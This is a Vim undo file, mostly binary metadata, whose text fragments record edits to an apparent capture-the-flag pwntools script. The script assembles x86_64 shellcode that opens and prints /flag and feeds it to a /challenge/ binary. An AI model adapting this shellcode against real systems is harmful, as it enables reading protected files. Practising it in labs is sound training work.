Vim�UnDo� �'YϽ�Q'�u�hn�ɥJ�M�5`�v�   ;                                  a5kz    _�                             ����                                                                                                                                                                                                                                                                                                                                                             a5h�     �                   �               5��                    :                       �      5�_�                    -        ����                                                                                                                                                                                                                                                                                                                            6           -           V        a5h�     �   ,   -       
   """)       <with process([f"/challenge/{os.getenv('HOSTNAME')}"])  as p:       fp = open("foobar" , "wb")       fp.write((shellcode))   C    print(p.recvuntil("Reading 0x1000 bytes from stdin.").decode())       p.send(shellcode)       p.interactive()        5��    ,       
               �      �               5�_�      	              -        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   ,   -           5��    ,                      �                     5�_�      
          	   *        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0       5��    )                      �                     5�_�   	              
   *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +          ""5��    )                     �                    5�_�   
                 *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      ""5��    )                     �                    5�_�                    *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      ""5��    )                     �                    5�_�                    *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      """"""5��    )                     �                    5�_�                    *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      """"""5��    )                     �                     5�_�                    *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      """""5��    )                     �                     5�_�                    *       ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   )   +   0      """"5��    )                     �                     5�_�                    ,        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   +   -   1       �   +   -   0    5��    +                      �                     �    +                      �                     �    +                     �                    �    +                  	   �             	       �    +           	       
   �      	       
       �    +           
          �      
              �    +                     �                    �    +                     �                    5�_�                    ,       ����                                                                                                                                                                                                                                                                                                                            .           .           V        a5h�     �   +   -   1      debug_shellcode5��    +                     �                    �    +                    �                    �    +                    �                    �    +                    �                    �    +                    �                    �    +                    �                    �    +                    �                    �    +                 	   �             	       �    +          	       	   �      	       	       5�_�                    ,       ����                                                                                                                                                                                                                                                                                                                            .           .           V        a5h�    �   +   -   1      debug_shellcode(shellcode)5��    +                     �                    5�_�                    *       ����                                                                                                                                                                                                                                                                                                                                                             a5h�    �   )   +   1      """5��    )                     �                     5�_�                    ,        ����                                                                                                                                                                                                                                                                                                                                                             a5j9    �               1   from pwn import *   	import re   # import pyperclip       context.log_level = 'critical'   context.arch = 'x86_64'   context.encoding = 'latin'   context.terminal = 'tmux'       shellcode = asm(r"""   xor rax, rax   inc rax   inc rax           push rdi       mov rdi, rsp           xor rsi, rsi   syscall       mov rdi, rax   
mov rax, 0           xor rdx, rdx   mov dl, 0x64   mov rsi, rsp   syscall           mov rdx, rax   
mov rax, 1   mov rdi , 1   mov rsi , rsp   syscall       flag:   .ascii "/flag\0"   """)       debug_shellcode(shellcode)       '''   0x2f62696e2f736800   '''    5�5�_�                            ����                                                                                                                                                                                                                                                                                                                                       0           V        a5kg     �              0   from pwn import *   	import re   # import pyperclip       context.log_level = 'critical'   context.arch = 'x86_64'   context.encoding = 'latin'   context.terminal = 'tmux'       shellcode = asm(r"""   xor rax, rax   inc rax   inc rax           push rdi       mov rdi, rsp           xor rsi, rsi   syscall       mov rdi, rax   
mov rax, 0           xor rdx, rdx   mov dl, 0x64   mov rsi, rsp   syscall           mov rdx, rax   
mov rax, 1   mov rdi , 1   mov rsi , rsp   syscall       flag:   .ascii "/flag\0"   """)           '''   0x2f62696e2f736800   '''    5��            0                       �              5�_�                            ����                                                                                                                                                                                                                                                                                                                                                  V        a5kh    �                   �               5��                    ,                       �      5�_�                    ,        ����                                                                                                                                                                                                                                                                                                                                                  V        a5kj     �   ,   .   -    5��    ,                      �                     5�_�                            ����                                                                                                                                                                                                                                                                                                                                       .           V        a5kw     �              .   from pwn import *   	import re   # import pyperclip       context.log_level = 'critical'   context.arch = 'x86_64'   context.encoding = 'latin'   context.terminal = 'tmux'       shellcode = asm(r"""   xor rax, rax   inc rax   inc rax       push 0x616c662f   push 0x00000067   push rdi       mov rdi, rsp           xor rsi, rsi   syscall       mov rdi, rax   
mov rax, 0           xor rdx, rdx   mov dl, 0x64   mov rsi, rsp   syscall           mov rdx, rax   
mov rax, 1   mov rdi , 1   mov rsi , rsp   syscall       flag:   .ascii "/flag\0"       """)        5��            .                       �              5�_�                            ����                                                                                                                                                                                                                                                                                                                                                  V        a5kw    �                   �               5��                    :                       �      5�_�                     /        ����                                                                                                                                                                                                                                                                                                                            /           /           V        a5kz   	 �   .   5        5��    .                      �      �               5�_�             	      -        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   ,   .        5��    ,                      �                     5�_�                    -        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   ,   .        5��    ,                      �                     5�_�                    -        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   ,   .        5��    ,                      �                     5�_�                    -        ����                                                                                                                                                                                                                                                                                                                            -           -           V        a5h�     �   ,   .        5��    ,                      �                     5�_�                     ,        ����                                                                                                                                                                                                                                                                                                                            ,           ,           V        a5h�     �   +   -        5��    +                      �                     5��